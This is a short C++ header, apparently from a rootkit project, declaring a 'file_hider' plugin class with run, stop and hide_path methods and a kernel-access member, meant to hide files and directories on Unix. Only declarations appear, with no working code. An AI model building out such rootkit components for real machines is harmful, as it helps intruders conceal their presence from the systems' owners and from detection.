//
// Created by idan on 1/11/24.
//

#ifndef ROOTKIT_FILE_HIDER_H
#define ROOTKIT_FILE_HIDER_H

#include "../../../basic/basic_plugin.h"
#include "kernel_access/kernel_access.h"

// hides files and directories. this is really useful as almost anything in unix is a file
class file_hider : public basic_plugin {
private:
    kernel_access kernelAccess;

public:
    void run() override;

    void stop() override;

    void hide_path(char* path);
};


#endif //ROOTKIT_FILE_HIDER_H
